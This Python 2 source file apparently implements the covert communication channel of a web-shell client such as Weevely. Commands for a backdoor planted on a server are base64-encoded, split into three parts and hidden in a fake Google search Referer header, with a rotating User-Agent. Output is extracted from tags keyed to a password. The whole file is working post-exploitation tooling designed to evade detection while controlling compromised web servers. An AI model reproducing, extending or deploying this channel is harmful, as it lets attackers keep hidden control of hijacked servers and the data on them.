from core.loggers import dlog
from core import config
import re
import urlparse
import random
import utils
import string
import base64
import urllib2

class LegacyReferrer:

    def __init__(self, url, password):

        self.url = url
        self.password = password
        self.extractor = re.compile(
            "<%s>(.*)</%s>" % (
                self.password[2:],
                self.password[2:]
            ),
            re.DOTALL
        )

        self.parsed = urlparse.urlparse(self.url)
        self.data = None

        if not self.parsed.path:
            self.query = self.parsed.netloc.replace('/', ' ')
        else:
            self.query = ''.join(
                    self.parsed.path.split('.')[:-1]
                ).replace('/', ' ')

        # Load agents
        self.agents = utils.http.load_all_agents()

        # Init additional headers list
        self.additional_headers = config.additional_headers

    def send(self, original_payload, additional_handlers = []):

        payload = base64.b64encode(original_payload.strip())
        length = len(payload)
        third = length / 3
        thirds = third * 2

        referer = "http://www.google.com/url?sa=%s&source=web&ct=7&url=%s&rct=j&q=%s&ei=%s&usg=%s&sig2=%s" % (
            self.password[:2],
            urllib2.quote(self.url),
            self.query.strip(),
            payload[:third],
            payload[ third:thirds],
            payload[thirds:]
        )

        opener = urllib2.build_opener(*additional_handlers)

        # When core.conf contains additional cookies, carefully merge
        # the new cookies and UA and add all the other headers
        additional_headers = []
        additional_ua = ''
        for h in self.additional_headers:
            if h[0].lower() == 'user-agent' and h[1]:
                additional_ua = h[1]
            elif h[0].lower() == 'referer' and h[1]:
                pass
            else:
                additional_headers.append(h)

        opener.addheaders = [
            ('User-Agent', (additional_ua if additional_ua else random.choice(self.agents))),
            ('Referer', referer),
        ] + additional_headers

        dlog.debug(
            '[R] %s' %
            (referer)
        )

        url = (
            self.url if not config.add_random_param_nocache
            else utils.http.add_random_url_param(self.url)
        )

        response = opener.open(url).read()

        if not response:
            return

        data = self.extractor.findall(response)

        if not data or len(data) < 1:
            return

        return data[0].strip()
